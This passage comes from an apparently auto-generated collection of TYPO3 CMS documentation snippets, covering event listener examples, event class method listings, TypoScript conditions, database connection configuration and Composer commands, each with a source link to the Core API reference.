TYPO3\\CMS\\Backend\\Form\\Event\\ModifyInlineElementControlsEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyInlineElementControlsEvent $event): void\n    {\n        $controls = $event->getControlItems();\n\n        // Modify an existing control\n        if (isset($controls['edit'])) {\n            $controls['edit']['html'] = '<button>Modified Edit</button>';\n        }\n\n        // Add a new control\n        $controls['myNewControl'] = [\n            'iconIdentifier' => 'actions-document-info',\n            'html' => '<button>My New Control</button>',\n        ];\n\n        // Remove a control\n        unset($controls['delete']);\n\n        $event->setControlItems($controls);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Manipulating Download Presets Event Listener in TYPO3 CMS\nDESCRIPTION: Example implementation of an event listener that modifies download presets for specific database tables in TYPO3's Web > List module. It adds a custom preset for the 'pages' table and modifies existing presets for the 'tt_content' table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforeRecordDownloadPresetsAreDisplayedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\RecordList\\DownloadPreset;\nuse TYPO3\\CMS\\Backend\\RecordList\\Event\\BeforeRecordDownloadPresetsAreDisplayedEvent;\n\nfinal readonly class PresetListener\n{\n    public function __invoke(BeforeRecordDownloadPresetsAreDisplayedEvent $event): void\n    {\n        // Add a preset to pages tables\n        if ($event->getTable() === 'pages') {\n            $presets = $event->getPresets();\n            $presets['LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:export.title'] =\n                new DownloadPreset(\n                    label: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:export.title',\n                    columns: ['title', 'slug', 'sys_language_uid']\n                );\n            $event->setPresets($presets);\n        }\n\n        // Modify existing presets for content elements\n        if ($event->getTable() === 'tt_content') {\n            $presets = $event->getPresets();\n            // Add a new column to download preset for standard preset\n            $existingStandardPreset = $presets['standard'] ?? null;\n            if ($existingStandardPreset instanceof DownloadPreset) {\n                $columns = $existingStandardPreset->getColumns();\n                // Add sys_language_uid\n                $columns[] = 'sys_language_uid';\n                $presets['standard'] = new DownloadPreset(\n                    label: $existingStandardPreset->getLabel(),\n                    columns: $columns\n                );\n            }\n            // Remove extended preset\n            unset($presets['extended']);\n            $event->setPresets($presets);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Service Subtypes in TYPO3\nDESCRIPTION: Example demonstrating how to define service subtypes for specific file formats or capabilities.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/Implementing.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n'subtype' => 'jpg,tif'\n```\n\n----------------------------------------\n\nTITLE: Setting Dynamic Page Content with TypoScript Conditions - TypoScript\nDESCRIPTION: This TypoScript snippet checks if the current day of the month is the 9th and sets the page value accordingly. It uses a conditional statement to dynamically change the content of 'page.10.value'. No external dependencies are required, and the key parameter involved is the current date. The expected output is different strings based on whether the condition is met.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Conditions1.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n[date(\"j\") == 9]\n   page.10.value = It is the 9th day of the month!\n[ELSE]\n   page.10.value = It is NOT the 9th day of the month!\n[END]\n```\n\n----------------------------------------\n\nTITLE: Alternative Method for Backend Layout Selection in TYPO3\nDESCRIPTION: Alternative TypoScript configuration for selecting backend layouts, which explicitly checks for a backend_layout field and falls back to inheritance from parent pages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendLayout.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\nfield = backend_layout\nifEmpty.data = levelfield:-2,backend_layout_next_level,slide\nifEmpty.ifEmpty = default\n```\n\n----------------------------------------\n\nTITLE: Running PHP-CS-Fixer in TYPO3 Projects\nDESCRIPTION: Bash command to execute PHP-CS-Fixer with a specific configuration file for TYPO3 projects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_4\n\nLANGUAGE: Bash\nCODE:\n```\nvendor/bin/php-cs-fixer fix --config=Build/php-cs-fixer/.php-cs-fixer.dist.php\n```\n\n----------------------------------------\n\nTITLE: Defining AfterPageWithRootLineIsResolvedEvent Class in TYPO3 Frontend\nDESCRIPTION: This snippet defines the AfterPageWithRootLineIsResolvedEvent class in the TYPO3\\CMS\\Frontend\\Event namespace. The class provides methods to get and set the request, response, and page information after a page has been resolved in the frontend process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterPageWithRootLineIsResolvedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass AfterPageWithRootLineIsResolvedEvent\n{\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation not shown\n    }\n\n    public function setResponse(\\Psr\\Http\\Message\\ResponseInterface $response): void\n    {\n        // Implementation not shown\n    }\n\n    public function getResponse(): ?\\Psr\\Http\\Message\\ResponseInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getPageInformation(): \\TYPO3\\CMS\\Frontend\\Page\\PageInformation\n    {\n        // Implementation not shown\n    }\n\n    public function setPageInformation(\\TYPO3\\CMS\\Frontend\\Page\\PageInformation $pageInformation): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Content Security Policy Reporting in TYPO3\nDESCRIPTION: This code demonstrates how to disable the Content Security Policy reporting endpoint globally for both backend and frontend in TYPO3. When disabled, any call to the reporting endpoint will result in a 403 HTTP error.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: php\nCODE:\n```\n// For backend\n$GLOBALS['TYPO3_CONF_VARS']['BE']['contentSecurityPolicyReportingUrl'] = '0';\n\n// For frontend\n$GLOBALS['TYPO3_CONF_VARS']['FE']['contentSecurityPolicyReportingUrl'] = '0';\n```\n\n----------------------------------------\n\nTITLE: Disabling contentObjectExceptionHandler in TypoScript for Debugging\nDESCRIPTION: TypoScript configuration to disable the TYPO3 content object exception handler, which provides more detailed exception information in the frontend. Should not be used in production as it exposes stack traces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Examples/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.contentObjectExceptionHandler = 0\n```\n\n----------------------------------------\n\nTITLE: ModifyRecordsAfterFetchingContentEvent Class Definition\nDESCRIPTION: PHP class definition for an event that is triggered after ContentContentObject fetches records from the database. The class provides methods to manipulate fetched records, configuration, and slide options before further processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/ModifyRecordsAfterFetchingContentEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n\nclass ModifyRecordsAfterFetchingContentEvent\n{\n    public function getRecords(): array\n    \n    public function setRecords(array $records)\n    \n    public function getFinalContent(): string\n    \n    public function setFinalContent(string $finalContent)\n    \n    public function getSlide(): int\n    \n    public function setSlide(int $slide)\n    \n    public function getSlideCollect(): int\n    \n    public function setSlideCollect(int $slideCollect)\n    \n    public function getSlideCollectReverse(): bool\n    \n    public function setSlideCollectReverse(bool $slideCollectReverse)\n    \n    public function getSlideCollectFuzzy(): bool\n    \n    public function setSlideCollectFuzzy(bool $slideCollectFuzzy)\n    \n    public function getConfiguration(): array\n    \n    public function setConfiguration(array $configuration)\n}\n```\n\n----------------------------------------\n\nTITLE: Overriding Error and Exception Handler Settings in TYPO3 CMS\nDESCRIPTION: This snippet demonstrates how to override the Core defaults for error and exception handlers in TYPO3 CMS. It sets custom classes for errorHandler, debugExceptionHandler, and productionExceptionHandler in the system configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Extending/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['errorHandler'] = \\Vendor\\Ext\\Error\\MyOwnErrorHandler::class;\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['debugExceptionHandler'] = \\Vendor\\Ext\\Error\\MyOwnDebugExceptionHandler::class;\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['productionExceptionHandler'] = \\Vendor\\Ext\\Error\\MyOwnProductionExceptionHandler::class;\n```\n\n----------------------------------------\n\nTITLE: Defining AfterPageTreeItemsPreparedEvent Class Methods\nDESCRIPTION: Documents the core methods of AfterPageTreeItemsPreparedEvent class including getRequest(), getItems(), and setItems(). These methods handle page tree item preparation and modification.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterPageTreeItemsPreparedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass AfterPageTreeItemsPreparedEvent {\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getItems(): array;\n    public function setItems(array $items);\n}\n```\n\n----------------------------------------\n\nTITLE: Including reStructuredText Directives for TYPO3 Documentation\nDESCRIPTION: Basic reStructuredText directives for including common definitions and setting up documentation structure with table of contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/GlobalValues/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. _globals-values:\n\n====================\nGlobal values\n====================\n\n..  todo: What are global values? Can this page be removed and the constants\n    be moved somewhere else?\n\n**Contents:**\n\n.. toctree::\n   :titlesonly:\n   :glob:\n\n   */Index\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeStdWrapContentStoredInCacheEvent Class in PHP\nDESCRIPTION: This snippet defines the BeforeStdWrapContentStoredInCacheEvent class with various methods for manipulating content, tags, cache keys, and lifetime. It is used in TYPO3 CMS to allow modification of stdWrap content before it's stored in cache.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/BeforeStdWrapContentStoredInCacheEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n\nclass BeforeStdWrapContentStoredInCacheEvent\n{\n    public function getContent(): ?string {}\n    public function setContent(string $content) {}\n    public function getTags(): array {}\n    public function setTags(array $tags) {}\n    public function getKey(): string {}\n    public function setKey(string $key) {}\n    public function getLifetime(): ?int {}\n    public function setLifetime(?int $lifetime) {}\n    public function getConfiguration(): array {}\n    public function getContentObjectRenderer(): \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer {}\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 ModifyDefaultConstraintsForDatabaseQueryEvent Class Methods\nDESCRIPTION: Defines the methods available in the ModifyDefaultConstraintsForDatabaseQueryEvent class for modifying database query constraints in TYPO3. The class provides methods to get and set constraints, table information, and context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/ModifyDefaultConstraintsForDatabaseQueryEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\Domain\\Event\n\n..  php:class:: ModifyDefaultConstraintsForDatabaseQueryEvent\n\n    ..  php:method:: getTable()\n        :returns: `string`\n\n    ..  php:method:: getTableAlias()\n        :returns: `string`\n\n    ..  php:method:: getExpressionBuilder()\n        :returns: `\\TYPO3\\CMS\\Core\\Database\\Query\\Expression\\ExpressionBuilder`\n\n    ..  php:method:: getConstraints()\n        :returns: `array<string,\\CompositeExpression|string>`\n\n    ..  php:method:: setConstraints(array $constraints)\n\n        :param $constraints: the constraints\n\n    ..  php:method:: getEnableFieldsToIgnore()\n        :returns: `array`\n\n    ..  php:method:: getContext()\n        :returns: `\\TYPO3\\CMS\\Core\\Context\\Context`\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Import/Export Extension via Composer\nDESCRIPTION: Command to install the TYPO3 import/export extension using Composer in the root directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateContent/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer req typo3/cms-impexp\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyImageManipulationPreviewUrlEvent Class in PHP for TYPO3 CMS Backend\nDESCRIPTION: This snippet defines the ModifyImageManipulationPreviewUrlEvent class with methods to retrieve and modify image manipulation preview URLs. It includes methods to access database rows, field configurations, file objects, and preview URLs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyImageManipulationPreviewUrlEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Form\\Event;\n\nclass ModifyImageManipulationPreviewUrlEvent\n{\n    public function getDatabaseRow(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getFieldConfiguration(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\File\n    {\n        // Implementation not shown\n    }\n\n    public function getPreviewUrl(): string\n    {\n        // Implementation not shown\n    }\n\n    public function setPreviewUrl(string $previewUrl)\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Global Configuration Variables in PHP\nDESCRIPTION: This snippet shows how to access and modify the global TYPO3 configuration variables using the $GLOBALS array. The configuration includes extension settings and feature toggles managed via the backend but excludes TCA modifications.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/ConfigurationOverview.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']\n```\n\n----------------------------------------\n\nTITLE: Configuring 'allow_redirects' in TYPO3\nDESCRIPTION: This snippet describes the 'allow_redirects' configuration option for HTTP requests in TYPO3. It allows enabling or disabling redirects and configuring redirect behavior, such as strict RFC compliance and maximum redirect attempts. The 'strict' sub-option determines whether POST requests are redirected as POST or GET requests, while 'max' limits the number of allowed redirects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['allow_redirects']\"\n```\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['allow_redirects']['strict']\"\n```\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['allow_redirects']['max']\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Table Options in TYPO3\nDESCRIPTION: This snippet illustrates how to set the `defaultTableOptions` for a database connection in TYPO3, specifically for MySQL/MariaDB. It defines the character set and collation to be used when creating new tables. This ensures consistent character encoding and sorting behavior across the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/DB.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n\"Connections\" => [\n    'Default' => [\n        'driver' => 'mysqli',\n        // ...\n        'charset' => 'utf8mb4',\n        'defaultTableOptions' => [\n            'charset' => 'utf8mb4',\n            'collation' => 'utf8mb4_unicode_ci',\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Defining LoginProviderInterface for TYPO3 CMS Backend in PHP\nDESCRIPTION: Declares the LoginProviderInterface with a method to modify the backend login view. The interface requires implementation of the modifyView method, which takes a ServerRequestInterface and ViewInterface as parameters and returns a string representing the template file to render.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Backend/LoginProviderInterface.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nphp:interface:: LoginProviderInterface\n\n    Interface for Backend Login providers\n\n    ..  php:method:: modifyView(\\Psr\\Http\\Message\\ServerRequestInterface $request, \\TYPO3\\CMS\\Core\\View\\ViewInterface $view)\n        :returns: `string`\n\n        Interface to render the backend login view.\n\n        See UsernamePasswordLoginProvider on how this can be used.\n\n        :param $request: the request\n        :param $view: the view\n        :Return description: Template file to render\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeRecordDownloadPresetsAreDisplayedEvent Class Methods in PHP\nDESCRIPTION: Documents the PHP methods available in the BeforeRecordDownloadPresetsAreDisplayedEvent class. This class provides functionality to manipulate download presets for database records, including getting and setting presets, retrieving the database table name, handling HTTP requests, and accessing record IDs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforeRecordDownloadPresetsAreDisplayedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\RecordList\\Event;\n\nclass BeforeRecordDownloadPresetsAreDisplayedEvent\n{\n    public function getPresets(): array\n    \n    public function setPresets(array $presets)\n    \n    public function getDatabaseTable(): string\n    \n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    \n    public function getId(): int\n}\n```\n\n----------------------------------------\n\nTITLE: Minimal RecordLinkHandler Configuration in Page TSconfig\nDESCRIPTION: This snippet shows the minimal required configuration for the RecordLinkHandler in Page TSconfig. It specifies the handler class, label, and the table to use for record selection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/RecordLinkHandler.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.anIdentifier {\n    handler = TYPO3\\CMS\\Backend\\LinkHandler\\RecordLinkHandler\n    label = LLL:EXT:extension/Resources/Private/Language/locallang.xlf:link.customTab\n    configuration {\n        table = tx_example_domain_model_item\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Extended Model in Extbase Persistence\nDESCRIPTION: Configuration file that maps the extended model class to the original database table, allowing Extbase to recognize the custom model as a valid extension of the original one.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendExtbaseModel/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nreturn [\n    \\MyVendor\\MyExtension\\Domain\\Model\\MyExtendedModel::class => [\n        'tableName' => 'tx_originalextension_domain_model_sometable',\n    ],\n];\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Page Content with User Login Conditions\nDESCRIPTION: Demonstrates two different syntaxes for checking user login status in TYPO3 TypoScript. The first example uses a less readable nested condition, while the second provides a more concise and readable approach to displaying different content based on login state.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Conditions4.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\npage = PAGE\npage.10 = TEXT\npage.10.value = You are logged in\n\n# This is hard to read\n[frontend.user.isLoggedIn]\n[ELSE]\n   page.10.value = You are *not* logged in\n[END]\n\n# This is faster to read\n[!frontend.user.isLoggedIn]\n   page.10.value = You are *not* logged in\n[END]\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Testing Dependencies with Composer\nDESCRIPTION: Composer commands to install development dependencies for testing, including TYPO3 coding standards and testing framework.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_1\n\nLANGUAGE: Bash\nCODE:\n```\ncomposer req --dev typo3/coding-standards\n```\n\nLANGUAGE: Bash\nCODE:\n```\ncomposer req --dev typo3/coding-standards typo3/testing-framework\n```\n\n----------------------------------------\n\nTITLE: Including RST File Dependencies\nDESCRIPTION: ReStructuredText include directives for required documentation files\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterFormEnginePageInitializedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Link Validator Event Listener for Local Page Links\nDESCRIPTION: A PHP class that implements an event listener to analyze external links pointing to local pages before record analysis. The listener checks content in the tt_content table's bodytext field for links containing a specific domain (example.org) and processes them accordingly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent/ExampleInvoke.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Linkvalidator\\Event\\BeforeRecordIsAnalyzedEvent;\n\nfinal readonly class CheckExternalLinksToLocalPagesEventListener\n{\n    private const LOCAL_DOMAIN = 'example.org';\n    private const TABLE_NAME = 'tt_content';\n    private const FIELD_NAME = 'bodytext';\n\n    public function __invoke(BeforeRecordIsAnalyzedEvent $event): void\n    {\n        $table = $event->getTableName();\n        if ($table !== self::TABLE_NAME) {\n            return;\n        }\n        $results = $event->getResults();\n        $record = $event->getRecord();\n        $field = (string)$record[self::FIELD_NAME];\n        if (!str_contains($field, self::LOCAL_DOMAIN)) {\n            return;\n        }\n        $results = $this->parseField($record, $results);\n        $event->setResults($results);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for TYPO3 Site Handling Documentation\nDESCRIPTION: This reStructuredText snippet defines the table of contents for the site handling documentation, listing various subtopics to be covered in separate files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :titlesonly:\n\n    Basics\n    CreateNew\n    BaseVariants\n    AddLanguages\n    ErrorHandling/Index\n    ErrorHandling/WriteCustomErrorHandler\n    StaticRoutes\n    UsingEnvVars\n    UseSiteInTypoScript\n    UseSiteInConditions\n    UseSiteInTCA\n    SiteSets\n    SiteSettings\n    SiteSettingDefinitions\n    SiteSettingsEditor\n    CliTools\n    AccessingSiteConfiguration\n    ExtendingSiteConfig\n```\n\n----------------------------------------\n\nTITLE: Including ReStructuredText Image for Simulated User Interface\nDESCRIPTION: This snippet includes a ReStructuredText directive to insert an image showing the interface when impersonating a user in the Backend Users module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/OverviewOfUsers/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Images/AutomaticScreenshots/AccessControl/SimulatedUser.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Creating File References in TYPO3 Backend\nDESCRIPTION: Demonstrates how to create file references using DataHandler in the backend context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$fileObject = $resourceFactory->getFileObject(1);\n\n// The sys_file_reference record\n$data['sys_file_reference']['NEW1234'] = [\n    'uid_local' => $fileObject->getUid(),\n    'uid_foreign' => 'NEW5678',  // uid of your content element\n    'tablenames' => 'tt_content',\n    'fieldname' => 'assets',\n    'pid' => 0,  // page id where the reference should be stored\n    'table_local' => 'sys_file',\n];\n\n// The referencing table's record (tt_content, etc.)\n$data['tt_content']['NEW5678'] = [\n    'assets' => 'NEW1234'  // must be the same as above!\n];\n\n$dataHandler = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n    \\TYPO3\\CMS\\Core\\DataHandling\\DataHandler::class\n);\n$dataHandler->start($data, []);\n$dataHandler->process_datamap();\n```\n\n----------------------------------------\n\nTITLE: Using TSFE in TYPO3\nDESCRIPTION: The TSFE (TypoScriptFrontendController) object provides public properties and methods for use by extensions. It is deprecated from version 13.4 and will be removed in TYPO3 v14. Access to `$GLOBALS['TSFE']` should be avoided unless necessary, with the class providing important utilities for TypoScript operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_3\n\n\n\n----------------------------------------\n\nTITLE: Configuring Table Mapping in TYPO3\nDESCRIPTION: This snippet shows how to configure table mapping in TYPO3 to use a separate database connection for the `be_sessions` table. It defines a new database connection named 'Sessions' and maps the 'be_sessions' table to this connection using the `TableMapping` configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/DB.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n        'Connections' => [\n            'Default' => [\n                // ...\n            ],\n            'Sessions' => [\n                'charset' => 'utf8mb4',\n                'driver' => 'mysqli',\n                'dbname' => 'sessions_dbname',\n                'host' => 'sessions_host',\n                'password' => '***',\n                'port' => 3306,\n                'user' => 'some_user',\n            ],\n        ],\n        'TableMapping' => [\n            'be_sessions' => 'Sessions',\n        ]\n```\n\n----------------------------------------\n\nTITLE: Defining Comment Model Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the Comment class for the BlogExample extension in TYPO3 CMS. It extends AbstractEntity and implements the Stringable interface. The class includes properties for author and content, with corresponding getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/AbstractEntity.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Comment extends AbstractEntity implements \\Stringable\n{\n    protected string $author = '';\n\n    protected string $content = '';\n\n    public function getAuthor(): string\n    {\n        return $this->author;\n    }\n\n    public function setAuthor(string $author): void\n    {\n        $this->author = $author;\n    }\n\n    public function getContent(): string\n    {\n        return $this->content;\n    }\n\n    public function setContent(string $content): void\n    {\n        $this->content = $content;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterGetDataResolvedEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement an event listener for the AfterGetDataResolvedEvent in TYPO3. It shows the class structure and method signature required for handling the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterGetDataResolvedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\ContentObject\\Event\\AfterGetDataResolvedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterGetDataResolvedEvent $event): void\n    {\n        // Do something\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::rightPad() in TYPO3 Repository (PHP)\nDESCRIPTION: Shows how to use the rightPad() function in a TYPO3 repository to pad a value with a specified character to a certain length from the right. It demonstrates creating a SELECT statement with the right-padded value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_16\n\nLANGUAGE: PHP\nCODE:\n```\npublic function findRightPaddedValues(): array\n{\n    $queryBuilder = $this->connectionPool->getQueryBuilderForTable('my_table');\n    $queryBuilder\n        ->select('uid')\n        ->addSelect(\n            $queryBuilder->expr()->rightPad(\n                'some_field',\n                10,\n                ' '\n            ),\n            'padded_value'\n        )\n        ->from('my_table');\n\n    return $queryBuilder->executeQuery()->fetchAllAssociative();\n}\n```\n\n----------------------------------------\n\nTITLE: AfterFileCopiedEvent Class Method Declarations\nDESCRIPTION: Defines methods for accessing file-related information after a copy operation in TYPO3's Resource Storage system. Methods provide access to source file, target folder, new file identifier and the newly created file instance.\nSOURCE: 